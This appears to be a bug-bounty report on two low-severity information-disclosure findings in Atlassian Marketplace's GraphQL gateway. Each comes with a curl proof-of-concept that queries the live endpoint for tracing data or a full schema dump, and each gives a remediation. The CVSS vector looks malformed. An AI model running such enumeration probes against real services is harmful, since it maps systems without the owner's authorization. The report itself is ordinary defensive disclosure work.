### Finding #1 — Apollo Tracing Enabled
| Field | Value |
|-------|-------|
| **Severity** | 🟡 MEDIUM (P5) |
| **CVSS** | 3.7 (V:2/T:E/E:X/Au:2/C:P/P:A:N) |
| **Endpoint** | `POST https://marketplace.atlassian.com/gateway/api/graphql` |
| **Type** | Information Disclosure |
| **Location** | Marketplace GraphQL Gateway |

**PoC:**
```bash
curl -s -X POST "https://marketplace.atlassian.com/gateway/api/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query":"query GetData { __typename }","operationName":"GetData"}'
```

**Response includes `extensions.tracing` with resolver timing data — exposes internal architecture.

**Impact:** Internal service topology and resolver performance metrics disclosed. Classification: P5 per program scope (GraphQL explicitly OOS).

**Remediation:** Disable Apollo tracing in production GraphQL gateway.

### Finding #2 — GraphQL Introspection Enabled (Massive Schema)
| Field | Value |
|-------|-------|
| **Severity** | ⚪ INFO (P5) |
| **CVSS** | 0.0 |
| **Endpoint** | `POST https://marketplace.atlassian.com/gateway/api/graphql` |
| **Type** | Information Disclosure |
| **Location** | Marketplace GraphQL Gateway (25,791 types + AI types) |

**PoC:**
```bash
curl -s -X POST "https://marketplace.atlassian.com/gateway/api/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { types { name kind fields { name type { name kind ofType { name kind } } } } } }"}'
```

**Impact:** Full schema enumeration — 25,791 types exposed. Includes Admin, User, AIConfigResponse, VirtualAgentQueryApi, ActionsMutation, WorkSuggestionsMutation, Compass component types. Could aid targeted attack but GraphQL explicitly OOS.

**Remediation:** Disable introspection in production.
